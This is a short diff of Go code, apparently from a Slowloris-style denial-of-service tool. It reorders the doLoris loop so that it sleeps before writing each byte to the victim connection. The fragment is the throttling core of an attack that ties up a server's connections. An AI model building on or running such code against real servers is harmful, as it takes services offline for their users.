@@ -142,14 +142,14 @@ func doLoris(conn io.ReadWriteCloser, victimUri *url.URL, activeConnectionsCh ch
 	readerStopCh := make(chan int, 1)
 	go nullReader(conn, readerStopCh)
 	for i := 0; i < *contentLength; i++ {
-		if _, err := conn.Write(sharedWriteBuf); err != nil {
-			log.Printf("Error when writing byte number %d of out %d: [%s]\n", i, *contentLength, err)
-			return
-		}
 		select {
 		case <-readerStopCh:
 			return
 		case <-time.After(*sleepInterval):
+		}
+		if _, err := conn.Write(sharedWriteBuf); err != nil {
+			log.Printf("Error when writing byte number %d of out %d: [%s]\n", i, *contentLength, err)
+			return
 		}
 	}
 }
